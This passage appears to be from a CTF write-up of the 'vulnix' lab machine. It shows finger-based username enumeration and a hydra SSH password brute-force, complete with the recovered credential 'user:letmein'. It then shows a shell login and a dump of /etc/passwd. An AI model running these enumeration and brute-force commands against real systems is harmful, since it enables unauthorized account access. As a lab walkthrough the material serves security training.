+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-m&nbsp;n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Maximum&nbsp;number&nbsp;of&nbsp;resolver&nbsp;processes&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>default<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;5<span style="color:#ff9d00;font-weight:700">)</span><br>
+                -u&nbsp;user&nbsp;&nbsp;Check&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;user&nbsp;exists&nbsp;on&nbsp;remote&nbsp;system<br>
+                -U&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;&nbsp;File&nbsp;of&nbsp;usernames&nbsp;to&nbsp;check&nbsp;via&nbsp;finger&nbsp;service<br>
+                -t&nbsp;host&nbsp;&nbsp;Server&nbsp;host&nbsp;running&nbsp;finger&nbsp;service<br>
+                -T&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;&nbsp;File&nbsp;of&nbsp;hostnames&nbsp;running&nbsp;the&nbsp;finger&nbsp;service<br>
+                -r&nbsp;host&nbsp;&nbsp;Relay.&nbsp;&nbsp;Intermediate&nbsp;server&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;allows&nbsp;relaying&nbsp;of&nbsp;finger&nbsp;requests.<br>
+                -p&nbsp;port&nbsp;&nbsp;TCP&nbsp;port&nbsp;on&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;finger&nbsp;service&nbsp;runs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>default<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;79<span style="color:#ff9d00;font-weight:700">)</span><br>
+                -d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Debugging&nbsp;output<br>
+                -s&nbsp;n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Wait&nbsp;a&nbsp;maximum&nbsp;of&nbsp;n&nbsp;seconds&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">reply</span>&nbsp;(default:&nbsp;5)<br>
+                -v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Verbose<br>
+                -h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;help&nbsp;message<br>
+                <br>
+                Also&nbsp;see&nbsp;finger-user-enum-user-docs.pdf&nbsp;from&nbsp;the&nbsp;finger-user-enum&nbsp;tar&nbsp;ball.<br>
+                <br>
+                Examples:<br>
+                <br>
+                $&nbsp;finger-user-enum.pl&nbsp;-U&nbsp;users.txt&nbsp;-t&nbsp;10.0.0.1<br>
+                $&nbsp;finger-user-enum.pl&nbsp;-u&nbsp;root&nbsp;-t&nbsp;10.0.0.1<br>
+                $&nbsp;finger-user-enum.pl&nbsp;-U&nbsp;users.txt&nbsp;-T&nbsp;ips.txt<br>
+                <br>
+                root@kali:~/ctf/vulnix/79finger#&nbsp;./finger-user-enum.pl&nbsp;-U&nbsp;../wordlists/smtpUsers.txt&nbsp;-t&nbsp;192.168.1.189<br>
+                Starting&nbsp;finger-user-enum&nbsp;v1.0&nbsp;(&nbsp;http://pentestmonkey.net/tools/finger-user-enum&nbsp;)<br>
+                <br>
+                &nbsp;----------------------------------------------------------<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Scan&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                &nbsp;----------------------------------------------------------<br>
+                <br>
+                Worker&nbsp;Processes&nbsp;.........&nbsp;5<br>
+                Usernames&nbsp;file&nbsp;...........&nbsp;../wordlists/smtpUsers.txt<br>
+                Target&nbsp;count&nbsp;.............&nbsp;1<br>
+                Username&nbsp;count&nbsp;...........&nbsp;15<br>
+                Target&nbsp;TCP&nbsp;port&nbsp;..........&nbsp;79<br>
+                Query&nbsp;timeout&nbsp;............&nbsp;5&nbsp;secs<br>
+                Relay&nbsp;Server&nbsp;.............&nbsp;Not&nbsp;used<br>
+                <br>
+                ########&nbsp;Scan&nbsp;started&nbsp;at&nbsp;Fri&nbsp;Apr&nbsp;12&nbsp;17:51:11&nbsp;2019&nbsp;#########<br>
+                Login:&nbsp;lp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name:&nbsp;lp<br>
+                Directory:&nbsp;/var/spool/lpd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell:&nbsp;/bin/sh..Never&nbsp;logged&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;bin<br>
+                Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;daemon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;daemon..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root..<br>
+                Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;mail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;mail..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>mail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan.....<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dovecot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Dovecot&nbsp;mail&nbsp;server..<br>
+                Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>dovecot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>false..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;news&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;news..<br>
+                Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>news&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;uucp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;uucp..<br>
+                Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>uucp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;nobody&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;nobody..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>nonexistent&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;games&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;games..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>games&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;vulnix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;backup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;backup..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>backups&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan.....<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dovenull&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Dovecot&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;user..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>nonexistent&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>false..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">man</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;man..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>cache<span style="color:#ff9d00;font-weight:700">/man</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>sh..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <span style="color:#0088ff;font-weight:400">########&nbsp;Scan&nbsp;completed&nbsp;at&nbsp;Fri&nbsp;Apr&nbsp;12&nbsp;17:51:11&nbsp;2019&nbsp;#########</span><br>
+                14&nbsp;results.
+            </div>
+        </div><br>
+        <br>
+        It turns out there are 2 users with home directories:<br>
+            <div class="codebox">
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;vulnix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan...<br>
+                <br>
+                Login<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;user..Directory<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Shell<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>bash..Never&nbsp;logged&nbsp;in...No&nbsp;mail...No&nbsp;Plan.....
+            </div>
+        </div><br>
+        <br>
+        These will be our 2 candidates for ssh bruteforce.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) ssh</strong></h2><br>
+        The rationale behind bruteforcing ssh is that everything else seemed like a dead end at this point.<br>
+        It should also be a ‘try it, may as well’ response, to bruteforce ssh, whenever you manage to enumerate legitimate users a system.<br>
+        Make it part of your routine.<br>
+        <br>
+        I tried bruteforcing vulnix first, then user.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>22ssh#&nbsp;hydra&nbsp;-v&nbsp;-l&nbsp;user&nbsp;-P&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Passwords<span style="color:#ff9d00;font-weight:700">/</span>darkweb2017-top1000.txt&nbsp;-e&nbsp;nsr&nbsp;-t&nbsp;4&nbsp;-o&nbsp;hydraUserTop1000.txt&nbsp;<span style="color:#ff9d00;font-weight:700">ssh://</span>192.168.1.189<br>
+                Hydra&nbsp;v8.8&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2019&nbsp;by&nbsp;van&nbsp;Hauser<span style="color:#ff9d00;font-weight:700">/</span>THC&nbsp;-&nbsp;Please&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;not&nbsp;use&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;military&nbsp;or&nbsp;secret&nbsp;service&nbsp;organizations,&nbsp;or&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">illegal</span>&nbsp;purposes.<br>
+                <br>
+                Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)&nbsp;starting&nbsp;at&nbsp;2019-04-12&nbsp;17:47:10<br>
+                [DATA]&nbsp;max&nbsp;4&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;4&nbsp;tasks,&nbsp;1003&nbsp;login&nbsp;tries&nbsp;(l:1/p:0),&nbsp;~1003&nbsp;tries&nbsp;per&nbsp;task<br>
+                [DATA]&nbsp;attacking&nbsp;ssh://192.168.1.189:22/<br>
+                [VERBOSE]&nbsp;Resolving&nbsp;addresses&nbsp;...&nbsp;[VERBOSE]&nbsp;resolving&nbsp;done<br>
+                [INFO]&nbsp;Testing&nbsp;if&nbsp;password&nbsp;authentication&nbsp;is&nbsp;supported&nbsp;by&nbsp;ssh://user@192.168.1.189:22<br>
+                [INFO]&nbsp;Successful,&nbsp;password&nbsp;authentication&nbsp;is&nbsp;supported&nbsp;by&nbsp;ssh://192.168.1.189:22<br>
+                [STATUS]&nbsp;44.00&nbsp;tries/min,&nbsp;44&nbsp;tries&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;0&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;01<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;959&nbsp;active<br>
+                [STATUS]&nbsp;33.33&nbsp;tries<span style="color:#ff9d00;font-weight:700">/</span>min,&nbsp;100&nbsp;tries&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;0&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;03<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;903&nbsp;active<br>
+                [STATUS]&nbsp;29.29&nbsp;tries<span style="color:#ff9d00;font-weight:700">/</span>min,&nbsp;205&nbsp;tries&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;0&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;07<span style="color:#ff9d00;font-weight:700">:</span>00h,&nbsp;798&nbsp;active<br>
+                [22][<span style="color:#ff9d00;font-weight:700">ssh</span>]&nbsp;host<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;192.168.1.189&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;user&nbsp;&nbsp;&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;letmein<br>
+                [STATUS]&nbsp;attack&nbsp;finished&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">192</span>.168.1.189&nbsp;(waiting&nbsp;for&nbsp;children&nbsp;to&nbsp;complete&nbsp;tests)<br>
+                1&nbsp;of&nbsp;1&nbsp;target&nbsp;successfully&nbsp;completed,&nbsp;1&nbsp;valid&nbsp;password&nbsp;found<br>
+                Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)&nbsp;finished&nbsp;at&nbsp;2019-04-12&nbsp;17:54:23
+            </div>
+        </div><br>
+        <br>
+        And thankfully bruteforcing user returned a password!<br>
+        ssh in using the username and password.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) /etc/passwd</strong></h2><br>
+        I tried looking for a means privilege escalation here, but the only useful bit of information to garner is /etc/passwd<br>
+            <div class="codebox">
+                user@vulnix<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span><br>
+                root<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>root<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                daemon<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>1<span style="color:#ff9d00;font-weight:700">:</span>1<span style="color:#ff9d00;font-weight:700">:</span>daemon<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>2<span style="color:#ff9d00;font-weight:700">:</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                sys<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>3<span style="color:#ff9d00;font-weight:700">:</span>3<span style="color:#ff9d00;font-weight:700">:</span>sys<span style="color:#ff9d00;font-weight:700">:/</span>dev<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                <span style="color:#ff9d00;font-weight:700">sync:</span>x<span style="color:#ff9d00;font-weight:700">:</span>4<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">:sync:/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sync</span><br>
+                games<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>5<span style="color:#ff9d00;font-weight:700">:</span>60<span style="color:#ff9d00;font-weight:700">:</span>games<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>games<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                <span style="color:#ff9d00;font-weight:700">man:</span>x<span style="color:#ff9d00;font-weight:700">:</span>6<span style="color:#ff9d00;font-weight:700">:</span>12<span style="color:#ff9d00;font-weight:700">:man:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>cache<span style="color:#ff9d00;font-weight:700">/man:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                <span style="color:#ff9d00;font-weight:700">lp:</span>x<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:lp:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>lpd<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>8<span style="color:#ff9d00;font-weight:700">:</span>8<span style="color:#ff9d00;font-weight:700">:</span>mail<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>mail<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
